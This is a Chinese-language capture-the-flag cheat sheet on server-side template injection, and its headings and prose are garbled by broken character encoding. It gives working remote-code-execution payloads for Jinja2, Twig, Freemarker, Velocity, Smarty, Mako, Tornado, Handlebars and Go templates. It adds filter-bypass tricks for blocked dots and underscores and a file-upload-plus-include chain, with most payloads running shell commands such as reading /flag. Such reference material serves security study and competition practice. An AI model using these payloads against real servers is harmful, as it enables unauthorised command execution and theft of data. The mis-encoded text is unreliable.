# ğŸ§© **ã€SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰é¢˜å‹å½’çº³ã€‘**

---

# **1. é¢˜ç›®ç±»å‹ï¼ˆå»é‡åˆå¹¶ç‰ˆï¼‰**

### **â‘  Jinja2 ç±»**

* Jinja2 åŸºç¡€ SSTI
* Jinja2 + ç‚¹å·è¿‡æ»¤ç»•è¿‡
* Jinja2 + ä¸‹åˆ’çº¿è¿‡æ»¤ç»•è¿‡
* Jinja2 + `{% set %}` å˜é‡æ„é€ 
* Jinja2 + `attr()` å±æ€§è®¿é—®é“¾
* Jinja2 å®Œå…¨æ— è¿‡æ»¤åˆ©ç”¨é“¾
* Jinja2 æ‹¼æ¥ç±»ç»•è¿‡ï¼ˆpopã€æ‹¼æ¥ `_`ã€æ‹¼æ¥ `__globals__`ï¼‰
* ä½¿ç”¨ cycler/joiner/lipsum ç­‰å†…ç½®å¯¹è±¡ä½œä¸ºè·³æ¿

### **â‘¡ å…¶ä»–æ¨¡æ¿å¼•æ“ï¼ˆç®€è®°ï¼‰**

* Twig
* Freemarker
* Velocity

ï¼ˆä¸»çº¿ä»æ˜¯ Jinja2ï¼Œä¸‹é¢ä¸»è¦é’ˆå¯¹ Jinja2ï¼‰

---

# **2. è§£é¢˜è¾“å‡ºæ€è·¯ï¼ˆå»é‡æ•´åˆï¼‰**

1. ä½¿ç”¨ `{{7*7}}` æ¢æµ‹æ³¨å…¥ï¼ˆåˆ¤æ–­æ˜¯å¦æ¸²æŸ“ï¼‰
2. åˆ¤æ–­æ¨¡æ¿å¼•æ“ï¼ˆä¸€èˆ¬ä¸º Jinja2ï¼‰
3. åˆ†æè¿‡æ»¤è§„åˆ™ï¼šæ˜¯å¦ç¦ç”¨ `{}` `.` `_` `{% %}`
4. æ ¹æ®è¿‡æ»¤é€‰æ‹©åˆé€‚çš„ç»•è¿‡æ–¹å¼ï¼ˆ`attr`ã€`set`ã€å­—ç¬¦ä¸²æ‹¼æ¥ï¼‰
5. æ„é€ è¿›å…¥ Python å±‚çš„å±æ€§é“¾ï¼ˆaccess â†’ `__globals__` â†’ `os`ï¼‰
6. ç”¨ `os.popen(...).read()` æ‰§è¡Œå‘½ä»¤
7. æŸ¥çœ‹ç›®å½• â†’ æ‰¾åˆ° flag â†’ è¯»å– flag

---

# **3. è§£é¢˜å…³æ³¨ç‚¹**

* `{{ }}` æ˜¯å¦è¢«è¿‡æ»¤
* `.`ï¼ˆç‚¹ï¼‰æ˜¯å¦å¯ç”¨
* `_`ï¼ˆä¸‹åˆ’çº¿ï¼‰æ˜¯å¦å¯ç”¨
* `{% set %}` æ˜¯å¦å…è®¸
* `attr()` æ˜¯å¦å¯ç”¨
* æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨å¯¹è±¡ï¼š`cycler`ã€`joiner`ã€`lipsum`ã€`namespace`ã€`self`
* è¿‡æ»¤æ­£åˆ™æ˜¯å¦å¯æ‹†åˆ†ï¼ˆä¾‹å¦‚ç¦ç”¨å¤šä¸ªå­—ç¬¦ä½†å¯æ‹¼æ¥ï¼‰

---

# **4. é€šç”¨æ­¥éª¤**

## **âœ” é€šç”¨æ­¥éª¤**

* `{{7*7}}` æ¢æµ‹

* ä½¿ç”¨å†…ç½®å¯¹è±¡ä½œä¸ºè·³æ¿ï¼š

  ```
  cycler.next.__globals__.os.popen('ls').read()
  ```

* æœ€ç»ˆåˆ©ç”¨é“¾è®¿é—®ï¼š

  * `__class__`
  * `__mro__`
  * `__subclasses__`
  * `__globals__`

* æ‰§è¡Œå‘½ä»¤ï¼š

  ```
  os.popen('cat /flag').read()
  ```

---

# **5. æ–¹æ³•è®º**

* **å¯¹è±¡é“¾ææƒæ³•**ï¼šä»å¯è®¿é—®å¯¹è±¡ï¼ˆå¦‚ cyclerï¼‰æ‰¾åˆ°å‡½æ•° â†’ `__globals__`
* **å±æ€§è®¿é—®æ›¿ä»£æ³•**ï¼šç¦ç‚¹å· â†’ ç”¨ `attr()`ï¼›ç¦ä¸‹åˆ’çº¿ â†’ åŠ¨æ€æ‹¼æ¥
* **åŠ¨æ€å­—ç¬¦æ„é€ æ³•**ï¼šæ„é€  `_` æˆ– `__`
* **å…¨å±€å‘½åç©ºé—´é€ƒé€¸**ï¼šæœ€ç»ˆç›®æ ‡æ˜¯æ‹¿åˆ° Python åŸç”Ÿå¯¹è±¡

æ ¸å¿ƒç›®æ ‡ï¼š
**æ‰¾åˆ°ä»»ä½•èƒ½è§¦è¾¾ Python å†…éƒ¨å¯¹è±¡çš„é“¾ â†’ è·å– os â†’ æ‰§è¡Œå‘½ä»¤ã€‚**

---

# **6. å¯å‘æ€§é—®é¢˜**

* é¡µé¢ä¸­å¯è®¿é—®å“ªäº›å¯¹è±¡ï¼Ÿï¼ˆcycler / joiner / self / namespaceï¼‰
* `.` æ˜¯å¦ç¦ç”¨ï¼Ÿ `_` æ˜¯å¦ç¦ç”¨ï¼Ÿ
* èƒ½å¦ç”¨ list/pop æ‹¼æ¥ `_`ï¼Ÿ
* èƒ½å¦ä½¿ç”¨ `attr()` è®¿é—®å±æ€§ï¼Ÿ
* æ˜¯å¦å¯æ’å…¥ `{% %}`ï¼Ÿ
* æ¨¡æ¿ä¸­æ˜¯å¦èƒ½ include å…¶ä»–æ–‡ä»¶ï¼Ÿ
* è¿‡æ»¤æ­£åˆ™æ˜¯å¦å¯æ‹†åˆ†ç»•è¿‡ï¼Ÿ

---

# **7. ç»•è¿‡æŠ€å·§**

* ç‚¹å·è¿‡æ»¤ â†’ `|attr('xxx')`

* ä¸‹åˆ’çº¿è¿‡æ»¤ â†’ åˆ—è¡¨ popã€æ‹¼æ¥å­—ç¬¦ä¸²ã€`join()`

* ç¦ `{}` â†’ ä½¿ç”¨ `{% %}` æ„é€ å˜é‡åè°ƒç”¨

* ç¦ `set` â†’ åˆ©ç”¨ namespace / self ä½œä¸ºè·³æ¿

* `__globals__` è¿‡æ»¤ â†’ åŠ¨æ€æ‹¼æ¥ï¼š

  ```
  ("_"*2 + "globals" + "_"*2)
  ```

* ä½¿ç”¨ cycler/joiner ä½œä¸ºè·³æ¿è¿›å…¥ Python

---

# **8. å®Œæ•´ Payload**

## **åŸºç¡€ç¡®è®¤ï¼š**

```
{{7*7}}
```

## **Jinja2 å®Œæ•´ RCEï¼ˆç»å…¸å…¨é“¾ï¼‰ï¼š**

```
{{ cycler.next.__globals__.os.popen('ls /tmp').read() }}
{{ cycler.next.__globals__.os.popen('cat /tmp/flag').read() }}
```

æˆ–ç­‰ä»·ï¼š

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /FLAG.txt').read() }}
```

## **ä½¿ç”¨ attr ç»•è¿‡ç‚¹å·ï¼š**

```
{{ cycler|attr("next")|attr("__globals__")|attr("os")|attr("popen")("ls").read() }}
```

## **æ„é€  `_`ï¼ˆä¸‹åˆ’çº¿è¢«ç¦ç”¨ï¼‰ï¼š**

```
{% set u = ['_','_','globals','_','_'] %}
{{ cycler|attr(u[0]+u[1]+u[2]+u[3]+u[4]) }}
```

æˆ–ï¼š

```
{{ ['a','b','_'].pop() }}
```

## **åŠ¨æ€æ‹¼æ¥ `__globals__`ï¼š**

```
{{ cycler.next[( "_" * 2 + "globals" + "_" * 2 )].os.popen("id").read() }}
```

## **ä½¿ç”¨ lipsum / joiner è·³æ¿ï¼š**

```
{{ lipsum.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__.os.popen('ls').read() }}
```

## **SSTI + include + ä¸Šä¼ ç»•è¿‡ï¼ˆå¸¸è§é“¾ï¼‰**

ä¸Šä¼  `pwn.html`ï¼Œå†…å®¹ï¼š

```
{{ cycler.next.__globals__.os.popen('cat /flag').read() }}
```

ä¹‹åé€šè¿‡è·¯å¾„è·³è½¬åŒ…å«ï¼š

```
pwn.html
```



# ğŸ§© **ã€å…¶ä»–æ¨¡æ¿å¼•æ“ SSTI å½’çº³ï¼ˆé™„å®Œæ•´ payloadï¼‰ã€‘**

å†…å®¹æ¶µç›–ï¼š

* Twigï¼ˆPHPï¼‰
* Freemarkerï¼ˆJavaï¼‰
* Velocityï¼ˆJavaï¼‰
* Smartyï¼ˆPHPï¼‰
* Makoï¼ˆPythonï¼‰
* Tornado Templateï¼ˆPythonï¼‰
* Handlebarsï¼ˆNode.jsï¼‰
* Go templateï¼ˆGoï¼‰

---

# **1. Twigï¼ˆPHPï¼‰**

## **1.1 ç±»å‹**

* åŸºç¡€ SSTI
* æ²™ç®±ç»•è¿‡ï¼ˆsandbox bypassï¼‰
* RCE via è°ƒç”¨ PHP å‡½æ•°
* Array/Filter ç»•è¿‡

## **1.2 è¾“å‡ºæ€è·¯**

1. æ¢æµ‹æ³¨å…¥ï¼š`{{7*7}}`
2. æ‰¾åˆ°å¯è®¿é—®å‡½æ•°/æ–¹æ³•
3. ä½¿ç”¨ sandbox ç»•è¿‡é“¾
4. è°ƒç”¨ç³»ç»Ÿæ–¹æ³•

## **1.3 å…³æ³¨ç‚¹**

* PHP å‡½æ•°æ˜¯å¦å¯ç›´æ¥è®¿é—®
* `attribute()` å¯å¦è°ƒç”¨æ„é€ 
* æ˜¯å¦å¼€å¯ sandbox

## **1.4 é€šç”¨ payload**

```
{{ _self.env.registerUndefinedFunctionCallback("system") }}
{{ system("id") }}
```

## **1.5 æ— è¿‡æ»¤å…¸å‹ payload**

```
{{ _self.env.getFilter('escape').call('id') }}
```

---

# **2. Freemarkerï¼ˆJavaï¼‰**

## **2.1 ç±»å‹**

* Freemarker RCEï¼ˆåå°„é“¾ï¼‰
* é™æ€æ–¹æ³•è®¿é—®
* exposeProperties

## **2.2 è¾“å‡ºæ€è·¯**

1. ä½¿ç”¨ `${7*7}` æ¢æµ‹
2. è®¿é—® Java é™æ€æ–¹æ³•é“¾
3. è°ƒç”¨ Runtime.getRuntime()

## **2.3 å…³æ³¨ç‚¹**

* can call: `.class` / `?api` / `?new`
* getRuntime æ˜¯å¦å¯è®¿é—®

## **2.4 å…¸å‹å®Œæ•´é“¾ï¼ˆpayloadï¼‰**

```
${"freemarker.template.utility.Execute"?new()("id")}
```

æˆ–åå°„é“¾ï¼š

```
${Runtime.getRuntime().exec("cat /flag")}
```

---

# **3. Velocityï¼ˆJavaï¼‰**

## **3.1 ç±»å‹**

* Velocity SSTI
* åå°„è°ƒç”¨ Runtime
* set å˜é‡æ„é€ é“¾

## **3.2 è¾“å‡ºæ€è·¯**

```
#set($x = "java.lang.Runtime")
#set($rt = $x.getRuntime())
$rt.exec("cat /flag")
```

## **3.3 å®Œæ•´ payload**

```
#set($r="".getClass().forName("java.lang.Runtime"))
#set($rr=$r.getRuntime())
$rr.exec("id")
```

---

# **4. Smartyï¼ˆPHPï¼‰**

## **4.1 ç±»å‹**

* Smarty 2 / Smarty 3
* PHP å‡½æ•°æ‰§è¡Œ
* `php` æ ‡ç­¾åˆ©ç”¨ï¼ˆSmarty2ï¼‰

## **4.2 è¾“å‡ºæ€è·¯**

* åˆ¤æ–­ç‰ˆæœ¬
* Smarty2 å¯ç›´æ¥ `{php}...{/php}`
* Smarty3 å¯ç”¨ `{*compile*}` æˆ–è¿‡æ»¤å™¨ç»•è¿‡

## **4.3 payload**

### Smarty2 (RCE)

```
{php} system('cat /flag'); {/php}
```

### Smarty3ï¼ˆå‡½æ•°å¯ç”¨æ—¶ï¼‰

```
{$smarty.template_object.display("cat /flag"|system)}
```

---

# **5. Makoï¼ˆPythonï¼‰**

## **5.1 ç±»å‹**

* Python ç›´æ¥æ‰§è¡Œ
* åˆ—è¡¨è§£æ / å†…ç½®è®¿é—®

## **5.2 è¾“å‡ºæ€è·¯**

Mako æ”¯æŒ `${ ... }` æ‰§è¡Œä»»æ„ Pythonã€‚

## **5.3 payload**

```
${__import__('os').popen('cat /flag').read()}
```

æˆ–ï¼š

```
${self.module.__dict__['os'].popen('ls').read()}
```

---

# **6. Tornado Templateï¼ˆPythonï¼‰**

## **6.1 ç±»å‹**

* Python è¡¨è¾¾å¼å¯ç›´æ¥æ³¨å…¥
* `{{ ... }}` æ‰§è¡Œ Python

## **6.2 payload**

```
{{ __import__("os").popen("cat /flag").read() }}
```

æˆ–è€…ï¼š

```
{{ handler.application.__dict__['os'].popen('id').read() }}
```

---

# **7. Handlebarsï¼ˆNode.jsï¼‰**

## **7.1 ç±»å‹**

* åŸç‰ˆ Handlebars æ—  RCE
* CTF å¸¸è§â€œæœåŠ¡ç«¯ç›´æ¥æ‹¼æ¥å‡½æ•°æ³¨å†Œâ€å¯¼è‡´æ¨¡æ¿æ‰§è¡Œ
* éœ€åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ / helper æ›¿æ¢

## **7.2 å…³æ³¨ç‚¹**

* æ˜¯å¦å¼€å¯ `allowProtoPropertiesByDefault`
* æ˜¯å¦å­˜åœ¨å¯æ§ helper

## **7.3 payloadï¼ˆNode åŸå‹é“¾æ³¨å…¥å‹ï¼‰**

```
{{#with (lookup this "__proto__")}}
  {{#with constructor}}
    {{#with prototype}}
      {{#with (lookup this "exec")}}
        {{exec "cat /flag"}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

ï¼ˆä¾èµ–é¢˜ç›®ç‰¹å®šæ„é€ ï¼‰

---

# **8. Go templateï¼ˆGoï¼‰**

æ ‡å‡† `text/template` / `html/template` æœ¬èº«ä¸å¯ RCEã€‚
ä½† CTF ä¸­å¸¸è§ **å‡½æ•°æš´éœ²**ï¼š

ä¾‹å¦‚æ³¨å†Œäº†ï¼š

```
FuncMap{"exec": Exec}
```

## **payload**

```
{{ exec "cat /flag" }}
```

æˆ–ä½¿ç”¨ indexï¼š

```
{{ index . "exec" "ls" }}
```

---

# ğŸ“Œ **æ€»ç»“ï¼šæ¨¡æ¿å¼•æ“ â€“ å®Œæ•´å¯¹ç…§è¡¨**

| æ¨¡æ¿å¼•æ“                  | å…¸å‹æ³¨å…¥ç‚¹   | æ˜¯å¦å¯ç›´æ¥æ‰§è¡Œä»£ç  | å…¸å‹é“¾                                  |
| --------------------- | ------- | --------- | ------------------------------------ |
| **Jinja2 (Python)**   | `{{ }}` | æ˜¯         | `cycler.next.__globals__.os.popen()` |
| **Twig (PHP)**        | `{{ }}` | éœ€ç»•è¿‡       | `_self.env ... system`               |
| **Freemarker (Java)** | `${ }`  | æ˜¯         | `Execute?new()`                      |
| **Velocity (Java)**   | `#set`  | æ˜¯         | åå°„ â†’ Runtime                         |
| **Smarty2 (PHP)**     | `{php}` | æ˜¯         | `system()`                           |
| **Smarty3 (PHP)**     | `{$}`   | éœ€ç»•è¿‡       | template_object è°ƒç”¨                   |
| **Mako (Python)**     | `${}`   | æ˜¯         | `__import__`                         |
| **Tornado (Python)**  | `{{}}`  | æ˜¯         | `__import__`                         |
| **Handlebars (Node)** | `{{}}`  | å¦ï¼ˆéœ€è¾…åŠ©ï¼‰    | åŸå‹é“¾æ±¡æŸ“                                |
| **Go template (Go)**  | `{{}}`  | å¦ï¼ˆéœ€è‡ªå®šä¹‰ï¼‰   | FuncMap æ³¨å…¥                           |
